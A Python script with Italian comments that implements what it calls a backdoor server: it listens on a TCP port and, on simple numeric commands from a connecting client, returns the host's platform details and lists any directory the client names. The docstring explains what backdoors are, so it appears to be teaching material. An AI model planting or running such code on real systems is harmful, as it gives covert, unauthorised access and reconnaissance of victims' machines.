'''
Il codice fornito crea un server backdoor che può essere utilizzato per ottenere informazioni sulla piattaforma del sistema, elencare i file in una directory specifica e gestire la connessione con i client.
Per Backdoor intendiamo una tecnica informatica che fornisce un accesso segreto e non autorizzato a un sistema, bypassando i normali controlli di accesso. Questo accesso clandestino può essere utilizzato 
per scopi legittimi, come il debug di un'applicazione o il ripristino dell'accesso a un sistema in caso di perdita di credenziali, ma è più spesso associato ad attività malevole.
Possono essere implementate tramite porte nascoste, injection, vulernabilità di sicurezza o simili.
'''
import socket, platform, os

# Definizione dell'indirizzo IP e della porta del server
SRV_ADDR = "•"  # L'indirizzo IP del server, probabilmente da sostituire con un valore valido
SRV_PORT = 1234  # La porta su cui il server sarà in ascolto

# Creazione di un socket TCP IPv4
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Associazione del socket all'indirizzo e alla porta specificati
s.bind((SRV_ADDR, SRV_PORT))

# Mette il socket in ascolto per una connessione in entrata
s.listen(1)

# Accetta una connessione in entrata
connection, address = s.accept()

# Stampa un messaggio per confermare la connessione del client
print("Client connected:", address)

# Loop principale per gestire le richieste del client
while True:
    try:
        # Riceve i dati inviati dal client
        data = connection.recv(1024)
    except:
        continue  # Ignora le eccezioni e continua con il prossimo ciclo

    # Se i dati ricevuti sono '1', invia informazioni sulla piattaforma al client
    if data.decode('utf-8') == '1':
        tosend = platform.platform() + " " + platform.machine()  # Informazioni sulla piattaforma
        connection.sendall(tosend.encode())  # Invia le informazioni al client

    # Se i dati ricevuti sono '21', riceve un percorso dal client e invia la lista dei file nella directory
    elif data.decode("utf-8") == '21':
        data = connection.recv(1024)  # Riceve il percorso dalla directory dal client
        try:
            filelist = os.listdir(data.decode('utf-8'))  # Ottiene la lista dei file nella directory specificata
            tosend = "\n".join(filelist)  # Formatta la lista dei file come una stringa separata da newline
        except:
            tosend = "Wrong path"  # Se si verifica un errore durante l'accesso alla directory
        connection.sendall(tosend.encode())  # Invia la lista dei file al client

    # Se i dati ricevuti sono '0', chiude la connessione attuale
    elif data.decode('utf-8') == '0':
        connection.close()  # Chiude la connessione attuale
        # Accetta una nuova connessione in entrata per consentire la comunicazione con altri client
        connection, address = s.accept()

# Fine del codice
